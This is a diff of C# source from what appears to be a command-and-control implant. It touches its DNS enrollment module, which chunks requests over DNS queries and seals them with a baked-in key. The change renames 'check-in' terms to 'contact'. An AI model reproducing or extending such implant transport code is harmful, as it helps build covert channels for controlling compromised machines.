@@ -14,7 +14,7 @@ namespace Rod.Implant.Internal;
 // token names no build, so its exchange rides plaintext and the key arrives
 // in the answer.
 //
-// A whole source-file module riding the DNS check-in module's file set (the
+// A whole source-file module riding the DNS contact module's file set (the
 // bake-time transport trim): the module compiles exactly when the walk holds
 // a dns- or doh-schemed entry.
 
@@ -52,10 +52,10 @@ internal static class DnsEnroll
             new Frame { Kind = FrameKind.EnrollRequest, Payload = ByteString.CopyFrom(request.ToByteArray()) },
         };
         var body = EnvelopeCodec.Encode(frames);
-        if (dial.Profile is { SealsCheckIns: true }
+        if (dial.Profile is { SealsContacts: true }
             && EnvelopeWire.ParseBakedKey(dial.Profile.EnvelopeKey) is { } seal)
         {
-            body = EnvelopeWire.SealCheckInBody(body, seal.KeyId, seal.Key, "rod-enroll-v1");
+            body = EnvelopeWire.SealContactBody(body, seal.KeyId, seal.Key, "rod-enroll-v1");
         }
 
         // Upload: one chunk per query, in order, terminal-flagged; each
@@ -118,10 +118,10 @@ internal static class DnsEnroll
         }
 
         var answerBody = answer.ToArray();
-        if (dial.Profile is { SealsCheckIns: true }
+        if (dial.Profile is { SealsContacts: true }
             && EnvelopeWire.ParseBakedKey(dial.Profile.EnvelopeKey) is { } open)
         {
-            answerBody = EnvelopeWire.TryOpenCheckInBody(answerBody, open.KeyId, open.Key, "rod-enroll-response-v1")
+            answerBody = EnvelopeWire.TryOpenContactBody(answerBody, open.KeyId, open.Key, "rod-enroll-response-v1")
                 ?? throw new C2.EnrollRejectedException("the dns enroll answer did not verify under the baked key");
         }
         return await EnrollFrames.MaterializeAsync(answerBody, dial, "dns");
